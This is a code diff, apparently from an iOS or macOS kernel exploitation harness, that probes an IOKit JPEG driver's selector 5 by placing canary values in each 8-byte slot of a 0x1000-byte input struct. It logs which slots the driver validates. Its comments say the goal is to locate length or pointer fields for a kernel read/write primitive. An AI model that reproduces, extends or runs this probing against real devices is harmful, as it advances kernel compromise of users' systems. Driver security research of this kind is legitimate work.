@@ -936,26 +936,41 @@ NSString *ModJpegMethods(void) {
     rs_jm_call(conn, 10, NULL, 0, NULL, 0, @"out of range");
     rs_jm_drain(notify, @"end");
 
-    // ---- echo test: sel5 is the ONE big-struct selector that returned kr=0 on
-    //      this build.  Fill everything past the 0x58 header with our canary
-    //      and see which offsets come back in the 4096-byte output.  Any
-    //      echoed canary is a CONTROLLED read-back channel through the driver,
-    //      which is the first step towards a kernel read primitive. ----
-    for (int round = 0; round < 2; round++) {
-        uint8_t *big = (uint8_t *)malloc(0x1000);
-        uint8_t *bigo = (uint8_t *)malloc(0x1000);
-        if (!big || !bigo) { free(big); free(bigo); break; }
-        memset(big, 0, 0x1000);
-        memset(bigo, 0, 0x1000);
-        rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161 + (uint64_t)round);
-        for (uint32_t k = (uint32_t)sizeof(RSJpegIn); k + 8 <= 0x1000; k += 8) {
-            uint64_t v = 0xC0FFEE5A00000000ull | (uint64_t)k | ((uint64_t)round << 32);
-            memcpy(big + k, &v, 8);
+    // ---- sel5 FIELD MAP: sel5 returns kr=0 with a zeroed 0x1000 struct but
+    //      0xe00002c2 (bad argument) once our canary sits past the 0x58 header,
+    //      so there ARE meaningful fields beyond the header.  Map them one
+    //      8-byte slot at a time: every slot whose canary changes the kr is a
+    //      field the driver reads and validates.  A length or a pointer field
+    //      is where a read/write primitive would live. ----
+    {
+        const uint32_t SLOT = 8, BASE = (uint32_t)sizeof(RSJpegIn);
+        const uint32_t NSLOT = (0x1000 - BASE) / SLOT;
+        uint32_t bad = 0, okc = 0;
+        AveLog(S(@"[jpegmethods] sel5 field map: %u slots of 8 bytes from +%#x", NSLOT, BASE));
+        for (uint32_t k = BASE; k + SLOT <= 0x1000; k += SLOT) {
+            uint8_t *big = (uint8_t *)malloc(0x1000);
+            uint8_t *bigo = (uint8_t *)malloc(0x1000);
+            if (!big || !bigo) { free(big); free(bigo); break; }
+            memset(big, 0, 0x1000);
+            memset(bigo, 0, 0x1000);
+            rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
+            uint64_t v = 0xC0FFEE5A00000000ull | (uint64_t)k;
+            memcpy(big + k, &v, SLOT);          // canary in THIS slot only
+            size_t os = 0x1000;
+            kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
+            if (kr != KERN_SUCCESS) {
+                bad++;
+                AveLog(S(@"[jpegmethods]   VALIDATED slot +%04x -> kr=%#x", k, kr));
+            } else {
+                okc++;
+            }
+            free(big);
+            free(bigo);
+            if (((k - BASE) & 0x3F) == 0x3F) rs_jm_drain(notify, @"fieldmap");
         }
-        rs_jm_call(conn, 5, big, 0x1000, bigo, 0x1000, S(@"echo sel5 round=%d", round));
-        rs_jm_drain(notify, S(@"echo sel5 round=%d", round));
-        free(big);
-        free(bigo);
+        AveLog(S(@"[jpegmethods] sel5 field map done: %u validated / %u ignored (of %u slots)",
+                 bad, okc, NSLOT));
+        rs_jm_drain(notify, @"fieldmap end");
     }
 
     IOServiceClose(conn);
